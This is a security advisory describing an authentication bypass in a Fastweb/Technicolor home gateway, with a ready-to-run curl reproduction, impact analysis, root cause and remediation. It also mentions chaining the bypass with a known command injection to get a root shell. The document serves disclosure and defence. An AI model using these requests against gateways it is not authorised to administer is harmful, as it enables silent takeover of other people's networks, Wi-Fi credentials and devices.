# Security Advisory: button-press login authentication bypass

- **Date:** 2026-10-04
- **Status:** verified on hardware, vendor not yet notified (report prepared below)
- **Affected:** Fastweb NeXXt One (Technicolor/Vantiva FGA221D / GDNT-S),
  firmware `22.2.0378_FW_058_FGA221D` (front-end fingerprint 20260515082010).
  The same web framework ships on the whole Homeware "button login" family,
  so sibling devices/boards are very likely affected — untested.

## Summary

The gateway's only administrative login is a physical ceremony: press two
side buttons for 3 seconds, then the web UI "confirms" the login.  The
server side of this confirmation performs **no verification at all**: any
HTTP session that sends

```
GET /status.cgi?act=nvset&service=login_confirm&cmd=7&loginPath=1
```

becomes a fully authenticated administrative session.  No button press is
required, no "arming" handshake is required, and there is no nonce or
server-side state tying the confirmation to a physical event.  The button
requirement exists purely in the client-side UI flow.

## Reproduction (LAN access required)

```bash
# 1. mint any session
curl -sk -c jar https://192.168.1.254/login
# 2. confirm — that is the entire attack
curl -sk -b jar -c jar \
  "https://192.168.1.254/status.cgi?act=nvset&service=login_confirm&cmd=7&loginPath=1"
# 3. session is now authenticated: previously 403-gated readouts answer 200
curl -sk -b jar "https://192.168.1.254/status.cgi?nvget=sysinfo"
```

Verified 2026-10-04 from two independent source hosts (a macOS client and a
Linux router on the same LAN), repeatedly, including on a freshly created
anonymous session.  `login_confirm&cmd=4` then reports `login_status:1`.

Additional characterisation (two-session control experiment):

- The press opens a ~20 s window visible to **every** session
  (`cmd=7` returns `loginPath:1` even for sessions that never armed), and
  any session may confirm during it — the window survives a confirm.
- `loginPath` values other than `1` (0, 3, absent) do not authenticate.
  Unknown `cmd` values return 404.  The bypass is specific to
  `cmd=7&loginPath=1`.

## Impact

Any device on the LAN (guests, compromised IoT, malware) can obtain full
gateway administration silently and repeatably: Wi-Fi credentials, DNS and
firewall configuration, TR-069/ACS settings, and — via the separately known
authenticated ping-diagnostic command injection (host parameter of
`service=pingstatus` is passed to a root shell; see hack-technicolor
issue #363 lineage) — a persistent root shell.  Combined, LAN access is
equivalent to full device compromise with zero user interaction.

## Root cause

`login_confirm` treats `loginPath=1` as proof of a physical button press
without checking any server-side button state.  The arming write
(`loginPath=2`) is advisory; the UI's press-wait is client-side theater.

## Remediation (vendor)

1. Authenticate the confirm only when a server-side press event is pending
   for the confirming session (bind the press to the armed session with a
   per-session nonce, verify server-side).
2. Until fixed, treat `loginPath=1` as untrusted input.
3. The same review should cover the read side: `login_confirm&cmd=7`
   exposes the press-window state to unauthenticated sessions.

## Mitigations for owners (until a firmware fix)

- Treat the LAN as a trust boundary: untrusted guests/IoT on the LAN can
  own the gateway silently.  Segment untrusted devices.
- Note the confirmation grants a session cookie; possession of an active
  session is otherwise indistinguishable from a legitimate login, so
  detection is hard.  Monitor for configuration changes you did not make.

## Tooling note

`homeware-toolkit` (this repository) implements the responsible, consented
use of this behaviour for owners: `homeware session login` tries the
no-press path first and falls back to the physical-button flow when a
future firmware finally verifies the press server-side (v2.3.1+).

## Credit

Discovered and verified independently by the maintainer of this repository
during owner-authorized research on their own device, 2026-10-04.
Disclosure to Vantiva PSIRT / Fastweb: pending maintainer decision.
